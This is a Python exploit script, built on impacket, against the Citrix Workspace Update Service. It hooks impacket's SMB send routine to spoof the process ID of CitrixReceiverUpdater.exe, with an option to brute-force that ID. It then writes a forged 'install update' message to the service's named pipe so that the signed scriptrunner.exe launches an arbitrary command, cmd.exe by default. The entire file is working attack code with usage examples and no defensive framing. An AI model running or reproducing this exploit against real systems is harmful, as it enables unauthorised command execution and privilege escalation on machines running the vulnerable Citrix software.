# Requirements: impacket
# Examples:
# python3 citrix_workspace.py -pid 1234 user@localhost  (defaults to cmd.exe and hash for Win10 2004 ScriptRunner hash)
# python3 citrix_workspace.py -pid 1234 user@localhost -update-hash 24f4845c08b5629c78de41c46411404ec822390f54431205e66d212e620e4f64 (specify ScriptRunner hash)
# python3 citrix_workspace.py user@localhost (use PID cycling mode to brute force PID)

import argparse
import sys
import logging
import time
import re
import json
import types
from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT, SMB
from impacket.smb3structs import SMB2_CREATE, SMB2_SESSION_FLAG_ENCRYPT_DATA

cru_pid = None
sendSMB_Original = None


def getData_Hooked(self, original):
    original['Pid'] = cru_pid
    return original.orignalGetData()


def sendSMB_Hooked(original, packet):

    global sendSMB_Original

    # Some ugly hacks here, essentially we are hooking
    # some original SMB1/2 function from impacket so we
    # can intercept the calls and patch the PID at the correct point

    if packet['Command'] is SMB2_CREATE:  # SMB2/3
        # If the command type is create for opening files/named pipes
        # then replace the Reserved (PID) field with our spoofed PID
        packet["Reserved"] = cru_pid
    elif packet['Command'] is SMB.SMB_COM_NT_CREATE_ANDX:  # SMB1
        # Additional level of hooks here since SMB1 packets are
        # handled differently, and in fact the impacket does use
        # the real process PID of the client, so we need to override
        # that behavior
        packet.orignalGetData = packet.getData
        packet.getData = types.MethodType(getData_Hooked, packet)

    # Send our packet using original sendSMB function
    sendSMB_Original(packet)


def openPipe(s, tid, pipe, accessMask):
    pipeReady = False
    tries = 50
    while pipeReady is False and tries > 0:
        try:
            s.waitNamedPipe(tid,pipe)
            pipeReady = True
        except Exception as e:
            print(str(e))
            tries -= 1
            time.sleep(2)
            pass

    if tries == 0:
        raise Exception('Pipe not ready, aborting')

    fid = s.openFile(tid, pipe, accessMask, creationOption=0x40, fileAttributes=0x80)

    return fid


def twos_comp(val, bits):
    """compute the 2's complement of int value val"""
    if (val & (1 << (bits - 1))) != 0: # if sign bit is set e.g., 8bit: 128-255
        val = val - (1 << bits)        # compute negative value
    return val                         # return positive value as is


def attemptExecution(smbClient, tid, pid, cmd, update_hash):

    logging.info('Attempting to connect to Citrix Update Service pipe')

    fid = openPipe(smbClient, tid, r'\UpdaterServicePipe-800fad42-1d0f-4f66-8e18-8a0938cdc721', 0x12019f)

    logging.info('Successfully opened pipe')

    namedPipeMessage = {
        # We want to install an update
        "MessageType": 1,
        # Signed executable that supports execution of other binaries (Signed Binary Proxy Execution)
        "UpdateFilePath": "c:\\windows\\sysnative\\scriptrunner.exe",
        # SHA256 hash of scriptrunner.exe, could be different for various OSes/patch level
        "UpdateFileHash": "%s" % update_hash,
        # Just execute, not interested in waiting for the result
        "InstallationTriggerBehavior": 1,
        # Command line arguments to pass to scriptrunner, arg[0] = executing program
        "CmdLineArguments": 'c:\\windows\\sysnative\\scriptrunner.exe -appvscript %s' % cmd
    }

    logging.info('Attempting to send install update command spoofing PID %d' % pid)
    response = None

    try:
        smbClient.writeNamedPipe(tid, fid, json.dumps(namedPipeMessage) + '\n', True)
        logging.info('Write to pipe succeeded, reading response...')
        response = json.loads(smbClient.readNamedPipe(tid, fid))

    except Exception as e:
        response = e

    finally:

        smbClient.closeFile(tid, fid)

        if response is not None and isinstance(response, dict) and response['ExitCode'] is not None:
            exitCode = twos_comp(response['ExitCode'], 31)
            if exitCode >= 0:
                logging.info('Command executed successfully, enjoy!')
                return True
            else:
                # Unfortunately -1 could come from a hash mismatch, token errors or
                # process launching errors (bad path or not signed).  We don't wait for the program to exit,
                # so it doesn't represent the exit code of the process.
                logging.error('Command execution failed with error %d', exitCode)
        else:
            logging.error('Command execution failed with exception %s, probably wrong PID', str(response))

        return False


def main():

    global cru_pid, sendSMB_Original

    logger.init()

    parser = argparse.ArgumentParser(add_help=True, description="SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-pid', action="store", nargs='?', type=int, help='the PID of CitrixReceiverUpdater.exe')
    parser.add_argument('-max-pid', action="store", nargs='?', type=int, default=50000,
                        help='the highest PID to use when in PID cycling mode (default: 50000)')
    parser.add_argument('-command', action='store', default="c:\\windows\\system32\\cmd.exe",
                        help='The command to execute, (Default: c:\\windows\\system32\\cmd.exe)')
    parser.add_argument('-update-hash', action='store', default='24f4845c08b5629c78de41c46411404ec822390f54431205e66d212e620e4f64')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    cru_pid = options.pid

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    # In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))

        # Store our original sendSMB function for later use
        sendSMB_Original = smbClient._SMBConnection.sendSMB
        # Hook the sendSMB function ready for interception
        smbClient._SMBConnection.sendSMB = types.MethodType(sendSMB_Hooked, smbClient._SMBConnection)

        if options.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip)
        else:
            smbClient.login(username, password, domain, lmhash, nthash)

        if smbClient.getDialect() != SMB_DIALECT:
            # Let's disable SMB3 Encryption for now
            smbClient._SMBConnection._Session['SessionFlags'] &= ~SMB2_SESSION_FLAG_ENCRYPT_DATA

        logging.info('Attempting to connect to IPC$')

        tid = smbClient.connectTree('IPC$')

        logging.info('Connected to IPC$')

        if cru_pid is not None:
            attemptExecution(smbClient, tid, cru_pid, options.command, options.update_hash)
        else:
            logging.info("Attempting to exploit using PID cycling mode with max PID %d", options.max_pid)
            logging.disable(logging.ERROR)
            cru_pid = 4
            while cru_pid < options.max_pid and attemptExecution(smbClient, tid, cru_pid, options.command,
                                                                 options.update_hash) is False:
                cru_pid += 4

            logging.disable(logging.DEBUG)
            if cru_pid < options.max_pid:
                logging.info("Successfully launched program using pid %d", cru_pid)
            else:
                logging.info("Exhausted PID search range, Citrix Workspace Updates might not be running")

        smbClient.close()

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))


if __name__ == "__main__":
    main()


